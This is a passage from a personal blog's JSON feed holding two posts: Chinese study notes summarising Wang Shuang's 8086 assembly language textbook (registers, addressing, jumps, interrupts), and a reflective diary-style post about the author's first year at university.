章节知识点总结","slug":"汇编语言 王爽 章节知识点总结","date":"2017-07-15T12:04:11.000Z","updated":"2019-02-10T13:47:02.784Z","comments":true,"path":"2017/07/15/汇编语言 王爽 章节知识点总结/","link":"","permalink":"http://leo.dropsec.xyz/2017/07/15/汇编语言 王爽 章节知识点总结/","excerpt":"王爽老师的书差不多看了一半，听很多人说这位老师的书写的很不错，为了看完之后不至于很容易的忘记，故结合前人笔记草草回顾一遍…","text":"王爽老师的书差不多看了一半，听很多人说这位老师的书写的很不错，为了看完之后不至于很容易的忘记，故结合前人笔记草草回顾一遍… 第一章 基础知识1.存储单元为1Byte，即字节。微小信息单位为1bit，其中1Byte=8bit。（一个存储单元可以存储8个bit，即8位二进制数。） 1GB=1024MB 1MB=1024KB 1KB=1024B 1B=8bit2.存储单元从零开始顺序编号。 第二章 寄存器3.8086CPU有14个寄存器，AX(accumulate) BX(base) CX(count) DX(data) SI DI指针寄存器：SP BP IP段寄存器：CS SS DS ES标志寄存器：PSW4.AX可分为AH(高8位）和AL(低8位)，均可以当做独立寄存器使用，互不影响。5.对于实验中溢出的数据，由PSW寄存器保存溢出值。6.8086CPU采用段地址和偏移地址，通过地址加法器来合成物理地址物理地址=段地址x 16 + 偏移地址（段的大小=偏移地址的长度）7.偏移地址16位，其变化范围为0—FFFFH；仅用偏移地址来寻址最多可寻64KB个内存单元。 第三章 寄存器（内存访问）8.字单元：存放一个字型数据（16位）的内存单元，由两个地址连续的内存单元，将起始地址为N的字单元简称为N地址字单元。9.8086CPU不支持数据直接入段寄存器10.栈：LIFO（后进先出） 8086CPU入栈（PUSH）和出栈（POP）以字为单位；11.SS：SP 任意时刻始终指向栈顶元素，PUSH AX由下面两步构成：（1）SP=SP-2，SS：SP指向当前栈顶前面的单元，以当前栈顶前面的单元作为新的栈顶；（2）将AX中的内容送入SS：SP指向的内存单元处，SS：SP此时指向新栈顶. （栈顶指针指向的元素最终都是有效的）12.8086CPU入栈时，栈顶从高地址向低地址方向移动，栈为空的时候，SS：SP指向最底部的字单元的偏移地址+2。13.出栈后，SS：SP指向新的栈顶，但之间栈顶的元素还在，只是不在栈中，在之后PUSH移动至此后，此数据将会被覆盖。 第4章 第一个程序14.一个汇编程序由多个段组成，这些段分别用来存放代码，数据，后者当做栈空间，一个有意义的汇编程序中至少有一个段，这个段用来存放代码。 第5章 【bx】和loop指令15.① 【 】表示偏移地址，也表示一个内存单元 ②（ ）表示“一个寄存器或一个内存单元中的内容” ③ Idata表示常量16.Loop指令的格式：loop 标号①（CX）＝（CX）- 1；②（CX）≠0，则转至标号处循环执行（CX）＝0，则继续向下执行 第7章 更灵活的定位内存地址的方法17.在汇编程序中，数据不能以字母开头(+0)18.伪指令：dw 定义字型数据；db 定义字节型数据；dd 定义双字型数据19.Si和Di不能够分成两个8位寄存器，功能和BX相近。20.大小写的转化方法：and al，11011111 b（大写）or al，00100000 b (小写) 第8章 数据处理的两个基本问题21.Reg（寄存器）：AX，BX，CX，DX（及其8位高低寄存器），SP，BP，Si, DiSreg（段寄存器）：DS，SS，CS，ES8086CPU只有BX，Si，Di, BP可以用【】来进行内存单元寻址，可以单独出现，或BXBX BPBP SiDi SiDi 组合出现22.在【】中使用BP，如果指令没有显性给出段地址，默认在SS中23.指令在执行前，所要处理的数据可以在3个地方：CPU内部，内存，端口24.div指令（除法指令）8位除数 16位除数16位被除数 32位被除数{ AX （低16位）DX（高16位）}AL（商）AH（余数） AX（商）DX（余数）25.伪指令dupdb/dw/dd 重复次数 dup（重复的字节/字型/双字型）dw 0, 0, 0, 0, 0, 0 ,0, 0 = dw 8 dup（0） 第9章 转移指令的原理26.转移指令：可以修改IP，或同时修改CS和IP的指令。8086CPU的转移行为：段间转移（修改CS：IP）段内转移（只修改IP）短转移：IP修改范围-128—127 近转移：IP修改范围 -32768—3276727.offset 取得标号处的偏移地址nop 空指令（占位置/用于程序对齐/设标号/延时）28.jmp指令 依据位移转移的jmp指令（CPU在执行jmp指令的时候不要需要转移的目的地址）jmp short 标号 段内短转移 功能：IP=IP+8位位移（标号处地址-jmp指令后第一个字节地址）jmp near ptr 标号 段内近转移 功能：IP=IP+16位位移 转移的目的地址在指令中的jmp指令jmp far ptr 标号 段间转移 功能：CS=标号所在段的段地址，IP=标号在段中的偏移地址 转移地址在寄存器中的jmp指令jmp 16位reg 功能：IP=（16位reg） 转移地址在内存中的jmp指令Jmp word ptr 内存单元地址（段内转移）功能：转移的偏移地址是内存单元中的内容Jmp dword ptr 内存单元地址（段间转移）功能：内存单元中的高地址处为转移的段 地址，低地址处是转移的目的偏移地址29.jcxz指令jcxz 标号 功能：相当于if(（cx）==0）jmp short 标号30.loop指令loop 标号 功能：相当于（cx）– ； if（（cx）!=0）jmp short 标号 第10章 CAll和RET指令31.call指令（和jmp指令进行比较） 依据位移转移的call指令（CPU在执行call指令的时候不要需要转移的目的地址）call 标号 相当于push IP /jmp near ptr 标号； 转移的目的地址在指令中的call指令call far ptr 标号 相当于push CS / push IP / jmp far ptr 标号 转移目的地址在寄存器中的call指令call 16位reg 相当于push IP / jmp 16位reg； 转移地址在内存中的call指令call word ptr 内存单元地址 相当于push IP / jmp word ptr 内存单元地址；call dword ptr 内存单元地址 相当于push CS / push IP /jmp dword ptr 标号32.ret和retf指令ret指令用栈中的数据，修改IP的内容，从而实现近转移，相当于pop IP；retf指令用栈中的数据，修改CS和IP中的内容，从而实现远转移；相当于pop IP/pop CS33.mul指令格式：mul reg 或者mul 内存单元；结果：8位乘法，结果放在AX中，16位乘法，则高位放在DX中，低位放在AX中 第11章 标志寄存器34.8086CPU的flag寄存器的结构35.adc指令（带进位的加法指令）格式：adc 操作对象1 操作对象2功能：操作对象1=操作对象1 + 操作对象2 + CF36.sbb指令（带借位的减法指令）格式：sbb 操作对象1 操作对象2功能：操作对象1=操作对象1 - 操作对象2 - CF37.cmp指令 （比较指令，不保存结果，影响相关标志位的值）格式：cmp 操作对象1 操作对象2功能： 操作对象1 - 操作对象238.检验比较结果的条件转移指令 （e:equal ；a:above ；b:below；）39.rep movsb相当于： s:movsb loop s rep的作用是根据CX的值，重复执行后面的穿传送指令。由于每执行一次movsb指令si和di都会递增或递减指向后一个单元或前一个单元，则rep movsb就可以循环实现(CX)个字符的传送。执行movsb相当于进行以下几步操作： ((es)16+(di))=((ds)16+(si)) 如果df=0 则si=si+1 di=di+1如果df=1 则si=si-1 di=di-1 40.cld 将标志寄存器的DF置0，正向std 将标志寄存器的DF置1，逆向pushf 将标志寄存器入栈popf 将标志寄存器出栈 第12章 内中断41.内中断就是CPU不再处理执行中的指令，而是转去处理这个特殊的信息 内中断的产生包括以下几个：除法错误（div指令产生的除法溢出） 中断类型码：0单步执行 中断类型码：1执行into指令 中断类型码：4执行int指令 中断类型码：n （int n） 42.关于中断过程CPU收到中断信息—生成中断类型码—查找中断向量表—找到中断处理程序入口（设置段地址和偏移地址）对于8086CPU，中断向量表存在于内存0000:0000—0000:03FF的1024个单元中，由于其中有一些空白的地方，所以我们一般将自己编写的中断程序放在0000:0020—0000:02FF的256个字节空间里。PC机的中断例程是由CPU硬件完成，在接受到中断信息后，会执行一下操作：① 产生中断类型码② 标志寄存器的值入栈（pushf）③ 设置标志寄存器中的IF和TF的值为0（原因在书P250和P273）④ CS内容入栈 （push CS）⑤ IP内容入栈 （push IP）⑥ IP=中断类型码4 （N4）⑦ CS=中断类型码4+2 （N4+2）43.编写中断处理程序的步骤① 保存用到的寄存器② 处理中断③ 恢复用到的寄存器④ 用iret指令返回44.Iret指令的功能用汇编语言描述为： POP IPPOP CSpopf 第13章 int指令45.int指令引发的中断（int n）过程：1.取得中断类型码n2.标志寄存器入栈，IF，TF设置为03.CS，IP入栈4.（IP）=（n 4），（CS）=（n 4 + 2） 46.BIOS中主要包含的内容 硬件系统的检测和初始化程序外部中断和内部中断的中断例程用于对硬件设备进行的I/O操作的中断例程其他和硬件系统相关的中断例程 第14章 端口47.shl（左移）和shr（右移）指令将一个寄存器或内存单元中的数据向左（向右）移位将最后移出的一位写入CF中最低位（最高位）用0补充 第15章 外中断48.外中断：对外部设备进行控制外放的输入—相关接口芯片的端口—CPU内存…………………………………………………….. 指令系统总结 8086CPU 提供以下几大类指令：1、数据传送指令比如：mov、push、pop、pushf、popf、xchg等都是数据传送指令，这些指令实现寄存器和内存、寄存器和寄存器之间的单个数据传送。2、算术运算指令比如：add、sub、adc、sbb、inc、dec、cmp、imul、idiv、aaa等都是算术运算指令，这些指令实现寄存器和内存中的数据的算数运算。它们的执行结果影响标志寄存器的：sf、zf、of、cf、pf、af位。3、逻辑指令比如：and、or、not、xor、test、shl、shr、sal、sar、rol、ror、rcl、rcr 等都是逻辑指令。除了not指令外，它们的执行结果都影响标志寄存器的相关标志位。4、转移指令可以修改IP ，或同时修改CS 和IP 的指令统称为转移指令。转移指令分为以下几类：（1）无条件转移指令，比如：jmp；（2）条件转移指令，比如：jcxz、je、jb、ja、jnb、jna等；（3）循环指令，比如：loop；（4）过程，比如：call、ret、retf；（5）中断，比如int、iret。5、处理机控制指令这些指令对标志寄存器或其他处理机状态进行设置，比如：cld、std、cli、sti、nop、clc、cmc、stc、hlt、wait、esc、lock等都是处理机控制指令。6、串处理指令这些指令对内存中的批量数据进行处理比如：movsb、movsw、cmps、scas、lods、stos等。若要使用这些指令方便地进行批量数据的处理，则需要和rep、repe、repne等前缀指令配合使用。 end","categories":[],"tags":[{"name":"计算机系统","slug":"计算机系统","permalink":"http://leo.dropsec.xyz/tags/计算机系统/"}]},{"title":"年少无为，卖马为生","slug":"年少无为，卖马为生","date":"2017-07-08T12:48:06.000Z","updated":"2018-07-30T12:52:24.500Z","comments":true,"path":"2017/07/08/年少无为，卖马为生/","link":"","permalink":"http://leo.dropsec.xyz/2017/07/08/年少无为，卖马为生/","excerpt":"前几天在浏览博客的时候无意间看到有人用“年少无为，卖马为生”来介绍自己，顿时心里五味陈杂…","text":"前几天在浏览博客的时候无意间看到有人用“年少无为，卖马为生”来介绍自己，顿时心里五味陈杂…我自认为我也算是一个有故事的人经历的缘故，在别人眼中我是一个沉稳、严肃、不怎么爱说话的大男孩大一这一年，对我来说无疑是一个有纪念意义的一年 那天刚好是我的生日，独自一人踏上了外地求学的旅程，临走之前我这样都自己说： 新的开始总要拿些新的东西去面对，“勇敢做自己，开拓XX滩。”是我送给每位即将远行好友的一句话，现在亦讲给自己。高考前100天曾这样写过：只知道彼时的我不会大喜也不会大悲，只是怀一颗平静、明朗的心接受自己努力学习的结果，继而换上行装、双手插兜、面带笑容走向远方…… 2016.9.7 踏进北门的那一刻，四年的大学生活就这样拉开了帷幕紧接着竞选了军训负责人并顺利的当选班长我的记忆只存在几秒如果说大一有记忆的话那么班长工作基本就是全部 必须承认这一年在学习上我是没怎么用心的没有长时间投入的做一件事情因此，有些时候会有一种滑稽可笑的想法感觉大一一年什么也没学到哈哈，这不是真的（严肃脸）‘非时’说：你至少学会怎么跟陌生人相处虽然她是一个“奇怪”的人 寒假是我大一生活中浓墨重彩的一笔和几个可以说是陌生人的陌生人去广州打工美资企业 Jabil十个白天九个黑夜自我感觉也没真正的吃到苦除夕前一天晚上游荡在广州塔下其间去了一趟深圳在大梅沙触摸到了沙滩和大海然后穿过亚热带到达了温带重新回到了我喜欢的冬天记忆特别清晰下火车后我内心一阵窃喜同时身体也在发抖…总之第一次远程，整体感觉不错喜欢上了那里一景一物给我带来的特有感觉聆听了我娜姐的故事 娜姐，今晚你给我讲你的故事，几年后，我会找到你给你讲我的故事，到时候请认真听。娜姐，勇敢追寻你的幸福吧，你幸福我便会幸福。2017.2.14 现在我的记忆还停留在寒假结束拉着行李箱走进学校谁会料到转眼之间暑假已经来到 这便是我的大一记忆不多却愈发珍贵 大一的暑假我选择了留校跟着实验室的学长学姐学点东西希望接下来的一年里自己可以静下心、低下头掌握一些真本领做一个技术控、IT男 最后简单整理一下这一年来零碎写下的便签 20160907-20161016，四十天。结束了很多，开始的也很多。遗憾的是其间诸多瞬间感受没有来得及记录下来。发现无论走到哪里，新结识的人很多都可以在某方面与之前的身边的人产生一一对应的关系，比如杰含、东浩、科鹏、雯静、娴梦……除此之外，还有便是以往的瞬间场景经常会与现在的瞬间场景出现惊人的一致性，而每到这个时候，总会不自主的颤抖几下。我想说的，还有，明天的我，明天的我们将会变成什么模样。对了，明天星期一。 既然睡的比较晚，那就晚点睡吧。真的不知道自己一天都干了些什么。微笑不出来。加强时间分配利用能力。睡喽，明天继续微笑。 浮现。管家。佛性童心。纯粹。朴。羽烬。自我与本我。光影低雕灯。冷暖。life&amp;light。书独慰藉。果然(燃)美。缬美。目送。chris。红格调。 我知道每天早起后我会忘记从床上拿下来眼镜、我知道我的眼镜会坏的、我知道 《周鸿祎自述》他们选择和拒绝一款产品，往往来源于人性很小的点。 ——周鸿祎 渐发现，熬夜其实很困，只是心中一直有所期待，有所牵挂的东西，它迟迟让你感觉下一秒可能就会有所惊喜，也许是你孤独惯了，幸福的人是从来不晚睡的。——季箐 每个人年轻的时候，都想离开自己的父母，离的越远越好，不知不觉真就走出很远，与他们相隔千山万水，有一天猛一回头你会发现，无论走多远，总有一根线连着你和他们，那时候父母已经变老，腿脚不再利索，于是你又折回头重回他们身边，和以前不一样的是，你变成了大人，他们变成了孩子。 ​​​​ Notebook that makes your wish come true with fairy magic. 最容易实现的目标是最成功的目标。 想听音乐，闭上眼睛，轻轻地把音响放到左耳边，感觉音量小了点，于是我把音量增加了一点点。再次闭上眼睛，感觉音量又大了一点。我尝试把音量再减一点，结果是感觉音量又小了点。 有些时候，我会循环这样的无聊的动作，然而大部分的时候我是无奈的。 真的想把白天的时间利用起来，晚上该睡就睡。以后每天我要尽量不在宿舍待。除了晚上睡觉回宿舍，其他时间尽量去实验室学点技术。 走过小径，枝叶还能摇摆、；走过楼道，电灯还能变亮；走进窄门，管缝还能喷水；站在那里，影子还能出现。原来，你依然是你，再怎么堕落你依然是你。请善待自己。 现在你拥有的很多东西，甚至是你不想要的，正是其他人想尽各种办法想得到的。这些东西随时都可能丢失，你要学会珍惜你所拥有的。 这个世界上哪里有什么岁月静好，只不过有人替你负重前行。 四年很长，它可以像青春那样长；四年也很短，它也可以像南北苑的距离一样短。 很奇怪，听着一个陌生人的歌，一遍又一遍的循环。我不喜欢晚睡，但我总是不自觉的想晚睡。 大家晚安","categories":[],"tags":[{"name":"洋流","slug":"洋流","permalink":"http://leo.dropsec.xyz/tags/洋流/"}]}]}